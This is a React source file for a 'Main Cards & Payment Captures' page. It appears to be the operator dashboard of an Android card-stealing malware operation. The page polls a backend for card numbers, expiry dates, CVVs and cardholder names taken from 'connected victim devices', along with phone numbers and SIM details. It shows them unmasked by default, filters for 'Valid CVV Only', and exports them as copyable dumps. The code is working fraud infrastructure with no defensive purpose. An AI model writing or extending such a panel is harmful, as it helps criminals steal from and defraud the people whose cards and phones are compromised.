import { useEffect, useMemo, useState } from "react";
import { Layout } from "@/components/layout";
import { getScraped, type ScrapedCard, type ScrapedDevice } from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import {
  CreditCard,
  Smartphone,
  Search,
  Copy,
  ShieldCheck,
  CheckCircle2,
  Eye,
  EyeOff,
  Sparkles,
  ArrowRight,
  Filter,
} from "lucide-react";
import { Link } from "wouter";

// Helper to identify card network brand
function getCardBrand(num: string): "visa" | "mastercard" | "rupay" | "amex" | "generic" {
  const clean = num.replace(/\D/g, "");
  if (clean.startsWith("4")) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(clean)) return "mastercard";
  if (/^(508|60|65|81|82)/.test(clean)) return "rupay";
  if (/^3[47]/.test(clean)) return "amex";
  return "generic";
}

function getBrandBadge(brand: string) {
  switch (brand) {
    case "visa":
      return (
        <span className="px-2 py-0.5 rounded bg-blue-600/20 border border-blue-500/40 text-blue-400 font-bold text-[10px] tracking-wider uppercase">
          VISA
        </span>
      );
    case "mastercard":
      return (
        <span className="px-2 py-0.5 rounded bg-amber-600/20 border border-amber-500/40 text-amber-400 font-bold text-[10px] tracking-wider uppercase">
          Mastercard
        </span>
      );
    case "rupay":
      return (
        <span className="px-2 py-0.5 rounded bg-emerald-600/20 border border-emerald-500/40 text-emerald-400 font-bold text-[10px] tracking-wider uppercase">
          RuPay
        </span>
      );
    case "amex":
      return (
        <span className="px-2 py-0.5 rounded bg-cyan-600/20 border border-cyan-500/40 text-cyan-400 font-bold text-[10px] tracking-wider uppercase">
          AMEX
        </span>
      );
    default:
      return (
        <span className="px-2 py-0.5 rounded bg-muted border border-card-border text-muted-foreground font-semibold text-[10px] tracking-wider uppercase">
          CARD
        </span>
      );
  }
}

export function ScrapedData() {
  const [cards, setCards] = useState<ScrapedCard[]>([]);
  const [devices, setDevices] = useState<ScrapedDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState<"cards" | "devices">("cards");
  const [search, setSearch] = useState("");
  const [masked, setMasked] = useState(false); // Default unmasked so admins can read instantly
  const [copied, setCopied] = useState<string | null>(null);
  const [brandFilter, setBrandFilter] = useState<string>("all");

  const { data: scrapeData } = usePolling(getScraped, 4000);

  useEffect(() => {
    if (!scrapeData) return;
    setCards(scrapeData.cards || []);
    setDevices(scrapeData.devices || []);
    setLoading(false);
  }, [scrapeData]);

  const maskNumber = (n: string) => {
    if (!masked) return n;
    if (n.length < 8) return n;
    return "•••• •••• •••• " + n.slice(-4);
  };

  const filteredCards = useMemo(() => {
    let result = cards;
    if (brandFilter !== "all") {
      if (brandFilter === "has-cvv") {
        result = result.filter((c) => c.cvv && c.cvv.trim().length >= 3);
      } else {
        result = result.filter((c) => getCardBrand(c.cardNumber) === brandFilter);
      }
    }
    if (!search) return result;
    const q = search.toLowerCase();
    return result.filter((c) =>
      [
        c.cardNumber,
        c.cardholderName,
        c.deviceModel,
        c.devicePhone,
        c.expiry,
        c.cvv,
        c.ownerTelegramId || "",
      ].some((v) => v.toLowerCase().includes(q))
    );
  }, [cards, search, brandFilter]);

  const filteredDevices = useMemo(() => {
    if (!search) return devices;
    const q = search.toLowerCase();
    return devices.filter((d) =>
      [
        d.model,
        d.phone,
        d.deviceId,
        d.sim1,
        d.sim2,
        d.ownerTelegramId || "",
      ].some((v) => v.toLowerCase().includes(q))
    );
  }, [devices, search]);

  const copyText = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1800);
  };

  return (
    <Layout>
      <div className="space-y-4 mb-6">
        {/* Header Banner */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-2 border-b border-card-border">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="p-1.5 rounded-lg bg-primary/10 text-primary">
                <CreditCard className="w-5 h-5" />
              </span>
              <h1 className="text-xl sm:text-2xl font-bold font-display tracking-tight text-foreground">
                Main Cards & Payment Captures
              </h1>
            </div>
            <p className="text-xs sm:text-sm text-muted-foreground">
              Direct telemetry of scraped payment cards and device credentials across your connected fleet.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => setMasked(!masked)}
              className="inline-flex items-center gap-1.5 px-3 h-9 rounded-xl border border-card-border bg-card text-xs font-semibold text-muted-foreground hover:text-foreground hover:border-primary transition-all"
            >
              {masked ? <Eye className="w-4 h-4" /> : <EyeOff className="w-4 h-4" />}
              {masked ? "Show Numbers" : "Mask Numbers"}
            </button>
            <button
              onClick={() => {
                const dump = cards
                  .map(
                    (c) =>
                      `CARD: ${c.cardNumber} | EXP: ${c.expiry} | CVV: ${c.cvv} | NAME: ${c.cardholderName} | DEV: ${c.devicePhone || c.deviceId}`
                  )
                  .join("\n");
                copyText(dump, "all-cards");
              }}
              className="inline-flex items-center gap-1.5 px-3.5 h-9 rounded-xl bg-primary text-primary-foreground text-xs font-semibold hover:bg-primary/90 transition-all"
            >
              {copied === "all-cards" ? (
                <>
                  <CheckCircle2 className="w-4 h-4" /> Copied All
                </>
              ) : (
                <>
                  <Copy className="w-4 h-4" /> Copy Dump ({cards.length})
                </>
              )}
            </button>
          </div>
        </div>

        {/* Top Controls: Tabs, Brand Filters, Search */}
        <div className="flex flex-col md:flex-row gap-3 items-stretch md:items-center justify-between">
          {/* Main Tabs (Cards vs Devices) */}
          <div className="flex items-center gap-1.5 bg-muted/60 p-1 rounded-xl border border-card-border self-start">
            <button
              onClick={() => setTab("cards")}
              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                tab === "cards"
                  ? "bg-card text-foreground shadow-sm border border-card-border"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              <CreditCard className="w-3.5 h-3.5 text-primary" />
              Main Cards
              <span className="px-1.5 py-0.2 rounded-full bg-primary/20 text-primary text-[10px]">
                {cards.length}
              </span>
            </button>
            <button
              onClick={() => setTab("devices")}
              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                tab === "devices"
                  ? "bg-card text-foreground shadow-sm border border-card-border"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              <Smartphone className="w-3.5 h-3.5" />
              Device Info
              <span className="px-1.5 py-0.2 rounded-full bg-muted text-muted-foreground text-[10px]">
                {devices.length}
              </span>
            </button>
          </div>

          {/* Search Box */}
          <div className="relative w-full md:w-80">
            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <input
              type="text"
              placeholder={
                tab === "cards"
                  ? "Search card, name, phone, CVV..."
                  : "Search device, phone, IMEI..."
              }
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-4 py-2 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
            />
          </div>
        </div>

        {/* Card Category / Brand Filter Pills (Only in cards tab) */}
        {tab === "cards" && (
          <div className="flex flex-wrap items-center gap-1.5 pt-1">
            <span className="text-[11px] font-semibold text-muted-foreground mr-1 flex items-center gap-1">
              <Filter className="w-3 h-3" /> Filter:
            </span>
            {[
              { id: "all", label: "All Cards" },
              { id: "visa", label: "Visa" },
              { id: "mastercard", label: "Mastercard" },
              { id: "rupay", label: "RuPay" },
              { id: "has-cvv", label: "Valid CVV Only" },
            ].map((f) => (
              <button
                key={f.id}
                onClick={() => setBrandFilter(f.id)}
                className={`px-2.5 py-1 rounded-lg text-xs font-medium border transition-colors ${
                  brandFilter === f.id
                    ? "bg-primary text-primary-foreground border-primary"
                    : "bg-card border-card-border text-muted-foreground hover:text-foreground"
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>
        )}
      </div>

      {/* Cards Grid / Devices Grid */}
      {loading ? (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          {[1, 2, 3, 4, 5, 6].map((i) => (
            <div key={i} className="h-44 rounded-2xl bg-card border border-card-border animate-pulse" />
          ))}
        </div>
      ) : tab === "cards" ? (
        filteredCards.length === 0 ? (
          <div className="glass-card p-12 text-center text-muted-foreground max-w-lg mx-auto rounded-2xl">
            <CreditCard className="w-12 h-12 mx-auto mb-3 opacity-30 text-primary" />
            <h3 className="font-bold text-base text-foreground mb-1">No Captured Cards</h3>
            <p className="text-xs text-muted-foreground leading-relaxed">
              When targets enter credit, debit, or ATM card details on connected victim devices,
              they will be automatically parsed, classified, and rendered here in real time.
            </p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {filteredCards.map((c, idx) => {
              const key = c.deviceId + c.cardNumber + idx;
              const brand = getCardBrand(c.cardNumber);
              const fullDetails = `CARD: ${c.cardNumber}\nNAME: ${c.cardholderName}\nEXPIRY: ${c.expiry}\nCVV: ${c.cvv}\nDEVICE: ${c.devicePhone || c.deviceId}\nIP: ${c.ip}`;

              return (
                <div
                  key={key}
                  className="rounded-2xl border border-card-border bg-card p-4 sm:p-5 flex flex-col justify-between shadow-sm hover:border-primary/50 transition-all group"
                >
                  {/* Top Bar of Card */}
                  <div>
                    <div className="flex items-center justify-between gap-2 mb-3">
                      <div className="flex items-center gap-1.5">
                        <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                        {getBrandBadge(brand)}
                      </div>
                      <span className="text-[10px] font-mono text-muted-foreground">
                        {c.timestamp || "Captured"}
                      </span>
                    </div>

                    {/* Realistic Microchip & Contactless Symbol */}
                    <div className="flex items-center justify-between mb-4">
                      <div className="w-8 h-6 rounded bg-gradient-to-tr from-amber-300 via-amber-200 to-amber-400 border border-amber-500/30 flex items-center justify-center opacity-90">
                        <div className="w-5 h-3 border border-amber-700/30 rounded-xs" />
                      </div>
                      <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest">
                        SECURE PAY
                      </span>
                    </div>

                    {/* 16 Digit Card Number */}
                    <div className="mb-3">
                      <div className="flex items-center justify-between">
                        <p className="text-lg sm:text-xl font-mono font-bold tracking-widest text-foreground select-all">
                          {maskNumber(c.cardNumber)}
                        </p>
                        <button
                          onClick={() => copyText(c.cardNumber, key + "-num")}
                          title="Copy Card Number"
                          className="p-1.5 rounded-lg hover:bg-muted text-muted-foreground hover:text-foreground transition-all"
                        >
                          {copied === key + "-num" ? (
                            <CheckCircle2 className="w-4 h-4 text-emerald-500" />
                          ) : (
                            <Copy className="w-4 h-4" />
                          )}
                        </button>
                      </div>
                    </div>

                    {/* Cardholder + Exp + CVV Row */}
                    <div className="grid grid-cols-3 gap-2 bg-muted/50 p-2.5 rounded-xl border border-card-border mb-3 font-mono text-xs">
                      <div>
                        <span className="block text-[9px] uppercase tracking-wider text-muted-foreground">
                          Cardholder
                        </span>
                        <p className="font-semibold truncate text-foreground">
                          {c.cardholderName || "UNKNOWN"}
                        </p>
                      </div>
                      <div>
                        <span className="block text-[9px] uppercase tracking-wider text-muted-foreground">
                          Expires
                        </span>
                        <p className="font-bold text-foreground">{c.expiry || "--/--"}</p>
                      </div>
                      <div>
                        <span className="block text-[9px] uppercase tracking-wider text-muted-foreground">
                          CVV / CVC
                        </span>
                        <div className="flex items-center gap-1">
                          <p className="font-bold text-red-500 dark:text-red-400">
                            {c.cvv || "---"}
                          </p>
                          <button
                            onClick={() => copyText(c.cvv, key + "-cvv")}
                            className="text-muted-foreground hover:text-foreground text-[10px]"
                          >
                            <Copy className="w-3 h-3" />
                          </button>
                        </div>
                      </div>
                    </div>

                    {/* Device info */}
                    <div className="text-[11px] text-muted-foreground flex items-center justify-between mb-4">
                      <span className="truncate">
                        📱 {c.deviceModel} ({c.devicePhone || c.deviceId.slice(0, 8)})
                      </span>
                      {c.ip && <span className="font-mono text-[10px]">🌐 {c.ip}</span>}
                    </div>
                  </div>

                  {/* Actions Footer */}
                  <div className="flex items-center gap-2 pt-2 border-t border-card-border">
                    <button
                      onClick={() => copyText(fullDetails, key + "-full")}
                      className="flex-1 h-9 rounded-xl bg-primary text-primary-foreground text-xs font-semibold hover:bg-primary/90 transition-all flex items-center justify-center gap-1.5"
                    >
                      {copied === key + "-full" ? (
                        <>
                          <CheckCircle2 className="w-3.5 h-3.5" /> Copied
                        </>
                      ) : (
                        <>
                          <Copy className="w-3.5 h-3.5" /> Copy Card Full
                        </>
                      )}
                    </button>
                    <Link
                      href={`/device/${c.deviceId}`}
                      className="h-9 px-3 rounded-xl border border-card-border hover:bg-muted text-xs font-semibold flex items-center justify-center gap-1 text-muted-foreground hover:text-foreground"
                    >
                      Device <ArrowRight className="w-3 h-3" />
                    </Link>
                  </div>
                </div>
              );
            })}
          </div>
        )
      ) : (
        /* Device Info Tab */
        filteredDevices.length === 0 ? (
          <div className="glass-card p-12 text-center text-muted-foreground max-w-lg mx-auto rounded-2xl">
            <Smartphone className="w-12 h-12 mx-auto mb-3 opacity-30 text-primary" />
            <h3 className="font-bold text-base text-foreground mb-1">No Scraped Devices</h3>
            <p className="text-xs text-muted-foreground">
              Connected devices with telemetry will appear here.
            </p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {filteredDevices.map((d) => (
              <div
                key={d.deviceId}
                className="rounded-2xl border border-card-border bg-card p-4 sm:p-5 flex flex-col justify-between"
              >
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-bold text-sm text-foreground flex items-center gap-1.5">
                      <Smartphone className="w-4 h-4 text-primary" />
                      {d.model}
                    </span>
                    <span className="text-[10px] font-mono text-muted-foreground">
                      ID: {d.deviceId.slice(0, 8)}
                    </span>
                  </div>
                  <div className="space-y-1.5 text-xs text-muted-foreground mb-4">
                    <p>📞 Phone: <span className="font-semibold text-foreground">{d.phone || "Unknown"}</span></p>
                    {d.sim1 && <p>📶 SIM 1: <span className="font-mono text-foreground">{d.sim1}</span></p>}
                    {d.sim2 && <p>📶 SIM 2: <span className="font-mono text-foreground">{d.sim2}</span></p>}
                    {d.battery && <p>🔋 Battery: <span className="text-foreground">{d.battery}%</span></p>}
                  </div>
                </div>
                <Link
                  href={`/device/${d.deviceId}`}
                  className="w-full h-9 rounded-xl bg-muted hover:bg-primary hover:text-primary-foreground text-xs font-semibold flex items-center justify-center gap-1.5 transition-all"
                >
                  Inspect Device <ArrowRight className="w-3.5 h-3.5" />
                </Link>
              </div>
            ))}
          </div>
        )
      )}
    </Layout>
  );
}
